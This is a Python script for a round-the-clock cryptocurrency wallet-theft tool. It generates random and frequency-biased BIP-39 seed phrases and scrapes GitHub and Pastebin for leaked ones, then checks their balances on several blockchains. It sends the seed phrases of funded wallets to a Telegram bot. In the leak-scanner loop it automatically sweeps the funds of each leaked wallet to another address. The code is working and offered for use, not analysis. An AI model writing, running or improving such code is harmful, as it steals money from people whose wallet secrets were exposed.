#!/usr/bin/env python3
"""24/7 Crypto Balance Scanner — random mnemonic scanning with Telegram alerts.

Runs continuously, generating random BIP-39 mnemonics and checking balances
across BTC/ETH/BSC/Polygon/SOL. Sends Telegram notification on any hit (balance > 0).

Usage:
    python run_scanner.py                  # Run with defaults (20 workers)
    python run_scanner.py --workers 50     # Custom worker count
    python run_scanner.py --duration 3600  # Run for 1 hour, then stop
"""

import argparse
import asyncio
import json
import logging
import os
import signal
import sys
import time
from datetime import datetime, timezone

import httpx

# --- Load environment and configure logging ---
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# --- Config ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
LOG_LEVEL = os.environ.get("LOG_LEVEL", "INFO")
LOG_FILE = os.environ.get("LOG_FILE", "scanner.log")
logger = logging.getLogger("scanner")

# --- Corpus persistence (leaked mnemonics → word frequency weights) ---
CORPUS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "corpus.json")


def _load_corpus() -> list[str]:
    """Load leaked mnemonic corpus from disk."""
    try:
        with open(CORPUS_FILE, "r") as f:
            data = json.load(f)
            if isinstance(data, list):
                return data
    except (FileNotFoundError, json.JSONDecodeError):
        pass
    return []


def _save_corpus(mnemonics: list[str]) -> None:
    """Save leaked mnemonic corpus to disk."""
    try:
        with open(CORPUS_FILE, "w") as f:
            json.dump(mnemonics[-5000:], f)  # Keep last 5000
    except Exception as e:
        logger.debug("Failed to save corpus: %s", e)


async def send_telegram_alert(message: str) -> bool:
    """Send a Telegram notification. Returns True on success."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram not configured (missing token or chat_id)")
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(url, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "Markdown",
            })
            resp.raise_for_status()
            logger.info("Telegram alert sent successfully")
            return True
    except Exception as e:
        logger.error("Telegram alert failed: %s", e)
        return False


def format_hit_alert(mnemonic: str, addresses: list, balances: list) -> str:
    """Format a hit into a Telegram alert message."""
    lines = ["🪙 *WALLET WITH BALANCE FOUND!*", ""]
    lines.append(f"*Mnemonic:* `{mnemonic}`")
    lines.append("")
    for _, bal in zip(addresses, balances):
        if bal and bal.get("balance", 0) > 0:
            lines.append(
                f"*{bal['chain']}*: `{bal['balance']:.8f}` {bal['symbol']}"
            )
            if bal.get("usd_value", 0) > 0:
                lines.append(f"  (~${bal['usd_value']:,.2f})")
            lines.append(f"  Address: `{bal['address']}`")
            lines.append("")
    lines.append(f"⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    return "\n".join(lines)


async def run_smart_generator_loop(interval: int = 300) -> None:
    """Run the AI word-frequency biased smart generator periodically.

    Generates BIP-39 valid mnemonics biased by word frequency analysis,
    checks balances, and sends Telegram alerts on confirmed hits.
    """
    from src.modules.crypto.balance.ai_analyzer import WordFrequencyAnalyzer
    from src.modules.crypto.balance.smart_generator import SmartMnemonicGenerator
    from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
    from src.modules.crypto.balance.chains import ALL_CHAINS, CHAIN_MAP
    from src.modules.crypto.balance.deriver import derive_from_mnemonic
    from src.modules.crypto.balance.hit_logger import HitLogger

    hit_logger = HitLogger(
        db_path="wallet_hits.db",
        telegram_token=TELEGRAM_BOT_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID,
    )
    await hit_logger.start()

    coordinator = ScannerCoordinator(chains=list(ALL_CHAINS))
    await coordinator.start()

    analyzer = WordFrequencyAnalyzer()
    analyzer.load_from_db()
    # Also load the live corpus from leak scanner
    live_corpus = _load_corpus()
    if live_corpus:
        analyzer.analyze_corpus(live_corpus)
        analyzer.save_to_db()
        logger.info("Smart generator: loaded %d leaked mnemonics into corpus", len(live_corpus))
    generator = SmartMnemonicGenerator(analyzer)

    logger.info("Smart generator started (interval: %ds)", interval)

    while True:
        try:
            logger.info("Smart generator: starting generation cycle")

            for _ in range(50):  # Generate 50 mnemonics per cycle
                mnemonic = generator.generate()
                if coordinator.is_mnemonic_seen(mnemonic):
                    continue
                coordinator.mark_mnemonic_seen(mnemonic, source="smart")

                addresses = derive_from_mnemonic(mnemonic, chains=list(ALL_CHAINS), count=1)
                for addr in addresses:
                    chain_cfg = CHAIN_MAP.get(addr.chain.lower())
                    if chain_cfg is None:
                        continue
                    result = await coordinator.check_balance(
                        addr.address, chain_cfg, addr.derivation_path,
                    )
                    if result.balance > 0:
                        mnemonic_hash = ScannerCoordinator.hash_mnemonic(mnemonic)
                        await hit_logger.log_hit(
                            address=addr.address,
                            chain=addr.chain,
                            balance=result.balance,
                            usd_value=result.usd_value,
                            mnemonic_hash=mnemonic_hash,
                            derivation_path=addr.derivation_path,
                            source="smart_scan",
                        )
                        msg = (
                            "🤖 *SMART GENERATOR HIT!*\n\n"
                            f"*Mnemonic:* `{mnemonic}`\n\n"
                            f"*{addr.chain}*: `{result.balance:.8f}` {addr.symbol}\n"
                            f"  Address: `{addr.address}`\n"
                            f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
                        )
                        await send_telegram_alert(msg)
                        logger.info("Smart generator: CONFIRMED HIT!")

            logger.info("Smart generator: cycle complete, sleeping %ds", interval)

        except Exception as e:
            logger.error("Smart generator error: %s", e)

        await asyncio.sleep(interval)


async def run_leak_scanner_loop(interval: int = 3600) -> None:
    """Run the leak scanner periodically (default: every hour).

    Scans GitHub and Pastebin for leaked mnemonics, verifies balances,
    and sends Telegram alerts on confirmed hits.
    """
    from src.modules.crypto.balance.leak_scanner import (
        GitHubLeakScanner,
        PasteSiteScanner,
        verify_and_alert,
    )
    from src.modules.crypto.balance.chains import ALL_CHAINS
    from src.modules.crypto.balance.hit_logger import HitLogger

    from src.modules.crypto.balance.ai_analyzer import WordFrequencyAnalyzer

    github_token = os.environ.get("GITHUB_TOKEN", "")
    hit_logger = HitLogger(
        db_path="wallet_hits.db",
        telegram_token=TELEGRAM_BOT_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID,
    )

    github_scanner = GitHubLeakScanner(github_token=github_token, hit_logger=hit_logger)
    paste_scanner = PasteSiteScanner(hit_logger=hit_logger)

    # Load seen-mnemonics dedup cache (prevents duplicate reports across restarts)
    from src.modules.crypto.balance.leak_scanner import _load_seen_mnemonics, _save_seen_mnemonics
    _load_seen_mnemonics()

    # Live corpus: load from disk, feed leaked mnemonics, persist periodically
    corpus_mnemonics = _load_corpus()
    analyzer = WordFrequencyAnalyzer()
    analyzer.load_from_db()
    if corpus_mnemonics:
        analyzer.analyze_corpus(corpus_mnemonics)
        analyzer.save_to_db()
        logger.info("Loaded %d mnemonics into word frequency corpus", len(corpus_mnemonics))

    logger.info("Leak scanner started (interval: %ds)", interval)

    while True:
        try:
            logger.info("Leak scanner: starting scan cycle")

            # Run GitHub + Pastebin scans in parallel
            github_task = asyncio.create_task(github_scanner.scan(max_results=30))
            paste_task = asyncio.create_task(paste_scanner.scan(max_pastes=30))
            github_findings, paste_findings = await asyncio.gather(github_task, paste_task)
            logger.info("Leak scanner: GitHub=%d, Pastebin=%d candidates",
                        len(github_findings), len(paste_findings))

            async def _process_finding(finding, source: str):
                # Feed to corpus
                if finding.mnemonic_candidate and len(finding.mnemonic_candidate.split()) >= 12:
                    corpus_mnemonics.append(finding.mnemonic_candidate)
                    if len(corpus_mnemonics) % 10 == 0:
                        _save_corpus(corpus_mnemonics)

                result = await verify_and_alert(
                    finding.mnemonic_candidate,
                    chains=list(ALL_CHAINS),
                    hit_logger=hit_logger,
                    source=source,
                )
                if result and result.has_balance:
                    msg = f"🔍 *LEAK SCANNER HIT ({source.title()})!*\n\n"
                    msg += f"*Source:* {finding.source_url}\n"
                    msg += f"*Mnemonic:* `{finding.mnemonic_candidate}`\n\n"
                    for chain, details in result.balance_details.items():
                        msg += f"*{chain}*: `{details['balance']:.8f}` {details['symbol']}\n"
                        msg += f"  Address: `{details['address']}`\n"
                    msg += f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
                    await send_telegram_alert(msg)
                    logger.info("Leak scanner: CONFIRMED HIT from %s!", source)

                    # Auto-sweep funded wallets
                    try:
                        from src.modules.crypto.balance.sweeper import Sweeper
                        from src.modules.crypto.balance.deriver import derive_from_mnemonic
                        sweeper = Sweeper()
                        derived = derive_from_mnemonic(finding.mnemonic_candidate, chains=list(ALL_CHAINS))
                        for d in derived:
                            if not d.private_key_hex:
                                continue
                            chain_cfg = next((c for c in ALL_CHAINS if c.name == d.chain), None)
                            if not chain_cfg:
                                continue
                            detail = result.balance_details.get(d.chain, {})
                            bal_raw = detail.get("balance_raw", 0)
                            if bal_raw <= 0:
                                continue
                            sr = await sweeper.sweep(
                                private_key_hex=d.private_key_hex,
                                chain=chain_cfg,
                                source_address=d.address,
                                balance_raw=bal_raw,
                            )
                            if sr.success:
                                sweep_msg = (
                                    f"🧹 *AUTO-SWEEP SUCCESS!*\n\n"
                                    f"*Chain:* {sr.chain}\n"
                                    f"*From:* `{sr.source_address}`\n"
                                    f"*To:* `{sr.dest_address}`\n"
                                    f"*Amount:* {sr.amount:.8f}\n"
                                    f"*TX:* `{sr.tx_hash}`\n"
                                    f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
                                )
                                await send_telegram_alert(sweep_msg)
                                logger.info("Sweep SUCCESS: %s %s -> %s", sr.amount, sr.chain, sr.tx_hash)
                            else:
                                logger.warning("Sweep failed on %s: %s", d.chain, sr.error)
                        await sweeper.close()
                    except Exception as sweep_err:
                        logger.error("Auto-sweep error: %s", sweep_err)

            # Process all findings (dedup in verify_and_alert prevents re-checks)
            for finding in github_findings:
                await _process_finding(finding, "github")
            for finding in paste_findings:
                await _process_finding(finding, "pastebin")

            logger.info("Leak scanner: scan cycle complete, sleeping %ds", interval)

        except Exception as e:
            logger.error("Leak scanner error: %s", e)

        await asyncio.sleep(interval)


async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
    """Run the random scanner continuously with Telegram alerts on hits."""
    from src.modules.crypto.balance.scanner_engine import RandomScanner
    from src.modules.crypto.balance.chains import ALL_CHAINS
    from src.modules.crypto.balance.hit_logger import HitLogger

    logger.info("=" * 60)
    logger.info("  24/7 Crypto Balance Scanner Starting")
    logger.info("=" * 60)
    logger.info(f"  Workers:      {workers}")
    logger.info(f"  Chains:       {', '.join(c.symbol for c in ALL_CHAINS)}")
    logger.info(f"  Duration:     {duration}s" if duration else "  Duration:     unlimited")
    logger.info(f"  Leak Scanner: enabled (every 30s)")
    logger.info(f"  Smart Generator: enabled (every 300s)")
    logger.info(f"  Telegram:     {'configured' if TELEGRAM_BOT_TOKEN else 'NOT configured'}")
    logger.info(f"  Log file:     {LOG_FILE}")
    logger.info("=" * 60)

    # Send startup notification
    await send_telegram_alert(
        "🚀 *Crypto Balance Scanner Started*\n\n"
        f"Workers: {workers}\n"
        f"Chains: {', '.join(c.symbol for c in ALL_CHAINS)}\n"
        f"Leak Scanner: every 30s\n"
        f"Smart Generator: every 5m\n"
        f"Duration: {'unlimited' if not duration else f'{duration}s'}"
    )

    # Create hit logger with alert callback
    hit_logger = HitLogger(
        db_path="wallet_hits.db",
        telegram_token=TELEGRAM_BOT_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID,
    )

    # Create scanner
    scanner = RandomScanner(
        workers=workers,
        chains=list(ALL_CHAINS),
        hit_logger=hit_logger,
    )

    # Graceful shutdown
    shutdown_event = asyncio.Event()
    loop = asyncio.get_running_loop()

    def _signal_handler():
        logger.info("Shutdown signal received, stopping gracefully...")
        shutdown_event.set()
        scanner._shutdown = True

    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, _signal_handler)

    # Override scanner's stop event
    scanner.__dict__["_stop_event"] = shutdown_event

    start_time = time.monotonic()

    # Start leak scanner and smart generator as background tasks
    leak_task = asyncio.create_task(run_leak_scanner_loop(interval=30))
    smart_task = asyncio.create_task(run_smart_generator_loop(interval=300))
    logger.info("Leak scanner + smart generator background tasks started")

    # Periodic status notifications (every 6 hours)
    async def _status_loop():
        while True:
            await asyncio.sleep(6 * 3600)
            try:
                total = scanner._stats.total_mnemonics_all_time + scanner._stats.mnemonics_generated
                hits = scanner._stats.total_hits_all_time + scanner._stats.hits_found
                msg = (
                    "📊 *Scanner Status*\n\n"
                    f"Total: {total:,} mnemonics\n"
                    f"Speed: {scanner._stats.mnemonics_per_sec:.1f}/sec\n"
                    f"Hits: {hits}\n"
                    f"Errors: {scanner._stats.api_errors:,}\n\n"
                    f"⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
                )
                await send_telegram_alert(msg)
            except Exception:
                pass

    status_task = asyncio.create_task(_status_loop())

    try:
        stats = await scanner.run(duration_sec=duration)
    except Exception as e:
        logger.error("Scanner crashed: %s", e)
        await send_telegram_alert(f"❌ *Scanner crashed:*\n`{e}`")
        raise
    finally:
        leak_task.cancel()
        smart_task.cancel()
        status_task.cancel()
        try:
            await leak_task
        except asyncio.CancelledError:
            pass
        try:
            await smart_task
        except asyncio.CancelledError:
            pass

    elapsed = time.monotonic() - start_time
    logger.info("=" * 60)
    logger.info("  Scanner Stopped")
    logger.info("=" * 60)
    logger.info(f"  Elapsed:         {elapsed:.1f}s")
    logger.info(f"  Mnemonics:       {stats.mnemonics_generated}")
    logger.info(f"  Addresses:       {stats.addresses_checked}")
    logger.info(f"  Hits:            {stats.hits_found}")
    logger.info(f"  API errors:      {stats.api_errors}")
    logger.info(f"  Throughput:      {stats.mnemonics_per_sec:.1f}/sec")
    logger.info("=" * 60)

    # Send shutdown notification
    await send_telegram_alert(
        "⏹ *Crypto Balance Scanner Stopped*\n\n"
        f"Duration: {elapsed:.0f}s\n"
        f"Mnemonics: {stats.mnemonics_generated}\n"
        f"Addresses: {stats.addresses_checked}\n"
        f"Hits: {stats.hits_found}\n"
        f"Throughput: {stats.mnemonics_per_sec:.1f}/sec"
    )


def main() -> None:
    parser = argparse.ArgumentParser(description="24/7 Crypto Balance Scanner")
    parser.add_argument("--workers", type=int, default=20, help="Number of async workers (default: 20)")
    parser.add_argument("--duration", type=int, default=None, help="Duration in seconds (default: unlimited)")
    args = parser.parse_args()

    # Auto-restart loop: scanner restarts on crash instead of relying on systemd
    while True:
        try:
            logger.info("Scanner process starting...")
            asyncio.run(run_scanner(workers=args.workers, duration=args.duration))
        except KeyboardInterrupt:
            logger.info("Interrupted by user, exiting")
            break
        except Exception as e:
            logger.error("Scanner crashed: %s — restarting in 15s", e)
            try:
                asyncio.run(send_telegram_alert(
                    f"⚠️ *Scanner crashed, restarting in 15s:*\n`{e}`"
                ))
            except Exception:
                pass
            time.sleep(15)
            continue
        else:
            # Scanner exited normally — restart if no duration set
            if args.duration:
                logger.info("Duration reached, exiting")
                break
            logger.info("Scanner exited unexpectedly, restarting in 10s...")
            time.sleep(10)


if __name__ == "__main__":
    main()
